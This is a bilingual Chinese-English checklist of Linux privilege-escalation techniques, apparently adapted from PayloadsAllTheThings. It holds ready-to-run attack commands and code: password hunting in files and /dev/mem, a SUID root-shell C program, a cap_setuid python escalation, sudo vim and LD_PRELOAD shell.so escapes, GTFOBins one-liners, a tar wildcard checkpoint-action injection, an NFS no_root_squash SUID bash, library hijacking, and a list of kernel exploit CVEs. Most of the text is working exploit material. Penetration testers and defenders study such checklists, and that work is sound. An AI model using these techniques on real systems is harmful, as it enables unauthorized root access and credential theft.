### Checklists - linux 提权之前必要信息搜集

#### 密码搜集

```
# ---------------
# 查找包含密码的文件
# Files containing passwords

grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

# ---------------
# 最近编辑过的文件
# Last edited files

# Files that were edited in the last 10 minutes

find / -mmin -10 2>/dev/null | grep -Ev "^/proc"

# ---------------
# 内存中的密码
# In memory passwords

strings /dev/mem -n10 | grep -i PASS

# ---------------
# 查找敏感文件
# Find sensitive files

$ locate password | more      
如结果
/boot/grub/i386-pc/password.mod
/etc/pam.d/common-password
/etc/pam.d/gdm-password
/etc/pam.d/gdm-password.original
/lib/live/config/0031-root-password
...

```


#### Scheduled tasks

计划任务

```
# ---------------
# Cron jobs

# 检查您是否具有对这些文件具有写入权限的访问权限。
# 检查文件内部，找到具有写权限的其他路径。

/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/at.allow
/etc/at.deny
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root




# ---------------
# Systemd timers
# 系统定时器


systemctl list-timers --all
NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

3 timers listed.



# ---------------
# SUID

# SUID / Setuid代表“执行时设置用户ID”，默认情况下在每个Linux发行版中都启用。
# 如果某个具有这个bit位的文件被运行，则uid会被属主owner改掉。 
# 如果这个文件属主owner为`root`，即使是用户`bob`执行了这个文件，uid也将被更改为root。 SUID位被表示为`s`

# SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. 
# If a file with this bit is ran, the uid will be changed by the owner one.
# If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`.
# SUID bit is represented by an `s`.



╭─swissky@lab ~  
╰─$ ls /usr/bin/sudo -alh                  
-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo

# ---------------
# Find SUID binaries
# 寻找已有SUID二进制程序

find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

# ---------------
# Create a SUID binary
# 创建一个SUID二进制程序

print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right
sudo chmod +s /tmp/suid # setuid bit

```


#### Capabilities

功能

```
# ---------------
# List capabilities of binaries
# 列出二进制文件的功能


╭─swissky@lab ~  
╰─$ /usr/bin/getcap -r  /usr/bin
/usr/bin/fping                = cap_net_raw+ep
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep


# ---------------
# Edit capabilities
# 编辑功能

/usr/bin/setcap -r /bin/ping            # remove
/usr/bin/setcap cap_net_raw+p /bin/ping # add


# ---------------
# Interesting capabilities
# 有趣的功能

# Having the capability =ep means the binary has all the capabilities.
# capability = ep 意味着这个二进制文件具有所有功能。


$ getcap openssl /usr/bin/openssl 
如结果
openssl=ep

# Alternatively the following capabilities can be used in order to upgrade your current privileges.
# 或者可以使用以下功能来升级当前权限

cap_dac_read_search # read anything
cap_setuid+ep # setuid

# Example of privilege escalation with cap_setuid+ep
# 例如 使用 cap_setuid+ep 进行权限提升

$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7

$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sh-5.0# id
uid=0(root) gid=1000(swissky)
```


#### SUDO

```
# ---------------
# NOPASSWD

# Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
# Sudo配置可能允许用户在不知道密码的情况下使用其他用户权限执行某些命令。

$ sudo -l
如结果
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim

# In this example the user demo can run vim as root, it is now trivial to get a shell by adding an ssh key into the root directory or by calling sh.
# 例如 名为demo的用户 可以使用root身份运行vim，现在轻易可以获取shell:
# 方法1.通过在根目录中添加ssh密钥

# 方法2.通过调用sh

sudo vim -c '!sh'
sudo -u root vim -c '!sh'


# ---------------
# LD_PRELOAD and NOPASSWD

# If LD_PRELOAD is explicitly defined in the sudoers file
# 如果在sudoers文件中显式定义了 LD_PRELOAD 如下
Defaults        env_keep += LD_PRELOAD

# 使用以下命令 编译c代码
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# shell.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}


# Execute any binary with the LD_PRELOAD to spawn a shell : 
# 使用LD_PRELOAD执行任何二进制文件 以派生得到shell：

sudo LD_PRELOAD=/tmp/shell.so find





# ---------------
# Doas

# There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf
# 有一些二进制程序 可以替代 sudo这个二进制程序，比如OpenBSD的doas，记得在/etc/doas.conf检查它的配置，如
# 配置允许:名为demo的用户 可以使用root身份运行vim
permit nopass demo as root cmd vim


# ---------------
# sudo_inject
# Using https://github.com/nongiach/sudo_inject

$ sudo whatever
[sudo] password for user:    

# Press <ctrl>+c since you don't have the password. 
# 没有密码时 直接按<ctrl>+c
# This creates an invalid sudo tokens.
# 创建一个无效的sudo tokens

$ sh exploit.sh
.... wait 1 seconds

# no password required :)
# 无需密码
$ sudo -i
# id
uid=0(root) gid=0(root) groups=0(root)


Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf
```


#### GTFOBins

https://gtfobins.github.io/

```
# GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
# GTFOBins是Unix二进制文件的精选列表，可被攻击者利用来绕过本地安全限制。

# 如
gdb -nx -ex '!sh' -ex quit
sudo mysql -e '! /bin/sh'
strace -o /dev/null /bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
```


#### Wildcard

通配符

[localh0t/wildpwn: unix wildcard attacks](https://github.com/localh0t/wildpwn)
```
# 
By using tar with –checkpoint-action options, a specified action can be used after a checkpoint.
# This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar.
# “Tricking” root to use the specific options is quite easy, and that's where the wildcard comes in handy.


# create file for exploitation
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

# vulnerable script
tar cf archive.tar *
```


#### Writable files

可写文件
```
find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
```

#### NFS Root Squashing

When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it.

当no_root_squash出现在`/etc/exports`中时，该文件夹是可共享的，远程用户可以挂载它

```
# create dir
mkdir /tmp/nfsdir  

# mount directory 
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir 
cd /tmp/nfsdir

# copy wanted shell 
cp /bin/bash . 	

# set suid permission
chmod +s bash 	
```

#### Shared Library

* 1. ldconfig


Identify shared libraries with `ldd`

使用`ldd`识别共享库

```
$ ldd /opt/binary
    linux-vdso.so.1 (0x00007ffe961cd000)
    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
```

Create a library in `/tmp` and activate the path.

在`/tmp`中创建一个库并激活路径

```
gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
/opt/binary
```

* 2. RPATH

（未完）


#### Groups

* Docker
* LXC/LXD

#### Kernel Exploits

利用linux内核漏洞提权

|名称|类型|适用环境|描述|
|:-------------:|--|--|-----|
|CVE-2016-5195 (DirtyCow)|Kernel Exploits|Linux Kernel <= 3.19.0-73.8|DirtyCow|
|CVE-2010-3904 (RDS)|Kernel Exploits| Linux Kernel <= 2.6.36-rc8|RDS|
|CVE-2010-4258 (Full Nelson)|Kernel Exploits|Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)|Full Nelson|
|CVE-2012-0056 (Mempodipper)|Kernel Exploits|Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)|Mempodipper |


详细参考 [PayloadsAllTheThings/Linux - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
